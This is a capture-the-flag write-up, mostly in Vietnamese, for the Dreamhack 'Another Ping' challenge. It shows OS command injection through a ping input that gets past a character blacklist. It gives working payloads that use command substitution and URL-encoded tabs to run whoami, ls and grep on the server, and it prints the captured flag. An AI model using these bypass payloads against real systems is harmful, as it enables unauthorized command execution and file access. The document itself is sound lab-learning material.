# dreamhack-another-ping
Write-up for Dreamhack Wargame "Another Ping". Exploiting OS Command Injection vulnerability by bypassing WAF filters (Blacklist validation).
# 1. Thăm dò và phân tích 
  Truy cập giao diện chall này bắt nhập một trường input yêu cầu nhập địa chỉ IP , thử nhập input hợp lệ là 1.1.1.1 Hệ thống trả về Ping tiêu chuẩn kèm theo dòng thông báo : 
  
  Command: ping -c 4 1.1.1.1

=== STDOUT ===
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_seq=1 ttl=63 time=74.2 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=63 time=50.9 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=63 time=52.3 ms
64 bytes from 1.1.1.1: icmp_seq=4 ttl=63 time=52.8 ms

--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2997ms
rtt min/avg/max/mdev = 50.907/57.549/74.165/9.618 ms

Return Code: 0

**server đang thực thi lệnh hệ thống và trực tiếp ghép chuỗi input của người dùng vào câu lệnh đó -> dấu hiệu lỗ hổng OS Command Injection**

# 2.Kiểm tra bộ lọc 
 *notes : lúc này tôi đang test ở browers*
  -Để xác nhận lỗ hổng , tôi thử chèn các ký tự ngắt lệnh như ; & | nhưng bất kể như nào nó cũng đều báo : Error: Invalid character detected.
  *lúc này vào burpsuite bắt request nè*
  -ở browers lúc nãy tôi đã thử truyền vào input 1.1.1.1&whoami nhưng nó vẫn báo là Error: Invalid character detected. nhưng khi vào burpsuite tôi nhận thấy kí hiệu & nó đã bị url encoding ở front-end thành ip=1.1.1.1%26whoami và back-end nó cũng đã chặn kí tự %26 
  -tôi thử thay lại ip=1.1.1.1&whoami  trong burpsuite thì server đã trả về như bình thường nhưng không thấy kết quả của câu lệnh thứ 2 ở đâu -> giả thuyết : có thể lệnh đã chạy nhưng output bị ẩn 

  # 3.kỹ thuật khai thác 
  -Thay vì nối lệnh bằng && thì tôi chuyển sang chèn lệnh 2 vào luôn lệnh 1 thử xem sao , sử dụng dấu '' buộc hệ thống phải thực thi lệnh bên trong backtick trước rồi lấy kết quả ghép vào lệnh ping luôn 
    payload : **ip=1.1.1.1'whoami'**
    result có dòng : "stderr":"ping: 1.1.1.1root: Name or service not known\n",
    -> whoami ra kết quả là root và nó ghép vào chuỗi 1.1.1.1 rồi truyền vào tham số ip -> kết quả là ko thể tìm thấy bất cứ ip nào như thế ( đại loại là thế ) 

  **khai thác** 
    payload : **ip=1.1.1.1'ls%09-la'** : ta sẽ sử dụng dấu tab rồi url encoding bởi vì gặp back-end đã chặn space , %20 ,... nên ta sẽ thử sử dụng dấu tab cũng tương tự như space rồi url encoding nó 
    result : "stderr":"ping: invalid argument: '-r--r--'\n", -> nhìn thấy đoạn '-r--r--' -> đây là 1 chuỗi trong file/folder hiện tại -> vấn bây giờ là ko phải chạy lệnh nữa mà là lọc rác để nhìn thấy tên file nhưng cách này ko khả nghi lắm bởi vì hệ thống chạy thành công và nhét nguyên đống chữ hỗn độn đó và lệnh ping . rồi nó cũng chỉ báo lỗi cái khúc '-r--r--'

  **giải pháp**
  -dùng grep 
    payload : ip=1.1.1.1'grep%09-r%09DH%09.'
    grep sẽ quét toàn bộ các file trong thư mục hiện tại -> nó thấy chuỗi DH -> nó sẽ trả về kết quả dạng DH{....}
    result : "stderr":"ping: 1.1.1.1./flag.txt:DH{c64c86a3e2121098:DuCIRT7xm4TTk90+35XNHQ==}: Name or service not known\n", 

    -> flag : DH{c64c86a3e2121098:DuCIRT7xm4TTk90+35XNHQ==}

    
